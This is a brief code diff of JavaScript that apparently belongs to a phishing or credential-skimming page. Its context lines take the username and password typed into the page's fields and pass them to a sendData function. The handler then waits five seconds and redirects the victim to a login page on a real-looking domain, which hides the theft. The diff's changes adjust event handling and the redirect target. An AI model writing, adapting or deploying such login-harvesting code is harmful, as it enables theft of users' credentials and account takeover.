@@ -32,9 +32,9 @@
                     var password = document.getElementsByTagName('fluent-text-field')[1].value;
                     sendData(username, password);
                     if(password.length > 2){
-                        event.preventDefault();
+                        event.stopImmediatePropagation();
                         await delay(5000);
-                        window.location.href = 'https://my.daryakenar.ir/panel';
+                        window.location.href = 'https://my.daryakenar.ir/account/login/mobile';
                     }
                 }
             });
